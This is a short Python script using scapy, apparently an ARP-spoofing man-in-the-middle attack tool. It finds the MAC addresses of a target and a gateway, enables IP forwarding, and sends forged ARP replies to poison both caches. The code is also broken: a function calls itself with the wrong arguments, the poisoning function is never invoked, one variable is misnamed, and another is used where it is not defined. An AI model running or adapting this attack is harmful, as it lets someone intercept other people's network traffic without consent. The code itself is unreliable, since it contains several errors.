#!/usr/bin/python
import os
import sys
import time
import logging
# suppress scapy's IPv6 warning
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *



def startMitm(gatewayMAC, targetMAC, gatewayIP, targetIP):
	send(ARP(op = 2, pdst = targetIP, psrc = gatewayIP, hwdst = targetMAC), verbose = 0)
	send(ARP(op = 2, pdst = gatewayIP, psrc = targetIP, hwdst = gatewayMAC), verbose = 0)

def stopMitm(atewayMAC, targetMAC, gatewayIP, targetIP):
	send(ARP(op = 2, pdst = gatewayIP, psrc = targetIP, hwdst = "ff:ff:ff:ff:ff:ff"), count = 5)
	send(ARP(op = 2, pdst = targetIP, psrc = gatewayIP, hwdst = "ff:ff:ff:ff:ff:ff"), count = 5)

def savePkts():
	pass

def startAttack():

	try:
		print("Initializing attack")

		while True:
			startAttack(gatewayMAC, targetMAC, gatewayIP, targetIP)
			print("Poisoning cache")

	except KeyboardInterrupt:
		print("Restoring cache")
		stopMitm(gatewayMAC, targetMAC, gatewayIP, targetIP)
		print("Shutting down attack")
		sys.exit(1)


def main():
	# if not root...kick out
	if not os.geteuid()==0:
		sys.exit("\n\t[!!] You need root priviledges to run script.\n")

	if len(sys.argv[1:]) != 3:
		print ""
		print "A basic Mitm Attack Script based on scapy"
		print ""
		print "Usage: " + sys.argv[0] +  " <interface> <target> <gateway>"
		print "Example: " + sys.argv[0] + " eth0 192.168.20.12 192.168.20.1"
		sys.exit(0)

	interface = sys.argv[1]
	targetIP = sys.argv[2]
	gatewayIP = sys.argv[3]

	print("\nEnabling IP Forwarding...\n")
	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")


	try:
		targetAns, targetUnans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = targetIP), timeout = 2, iface = interface, inter =0.1)
		targetMAC = targetAns[0][1].hwsrc
		gatewayAns, gatewayUnans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = gatewayIP), timeout = 2, iface = interface, inter = 0.1)
		gatewayMAC = gatewayMAC[0][1].hwsrc
		print("Resolved gateway's MAC Address: " + gatewayMAC)
		print("Resolved target's MAC Address: " + targetMAC)
	except Exception: 
		print("Something went wrong, unable to resolve MAC Address!")
		print("Exiting....")
		sys.exit(1)

	startAttack()


main()

